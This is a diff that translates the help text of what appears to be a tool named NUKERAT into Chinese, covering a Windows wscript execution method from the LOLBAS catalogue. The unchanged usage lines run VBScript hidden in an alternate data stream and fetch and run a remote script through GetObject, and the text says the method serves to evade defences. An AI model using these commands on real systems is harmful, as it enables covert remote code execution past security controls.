@@ -1,18 +1,18 @@
-ABOUT
+关于
     Windows utility to execute scripts. LOLBAS documents execute
     hidden code to evade defensive counter measures.
 
-USAGE:
+用法：
     wscript //e:vbscript {PATH}:script.vbs
     echo GetObject("script:{REMOTEURL:.js}") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js
 
-EXAMPLES:
+示例：
     wscript //e:vbscript {PATH}:script.vbs
     echo GetObject("script:{REMOTEURL:.js}") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js
 
-NUKERAT FLAGS:
-    -w <seconds>    Maximum wait time until timeout
-    -bg             Fork and run without waiting for output
+NUKERAT 选项：
+    -w <秒数>       等待超时的最大时间
+    -bg             后台运行，不等待输出
 
-    Example:
+    示例：
     wscript //e:vbscript {PATH}:script.vbs
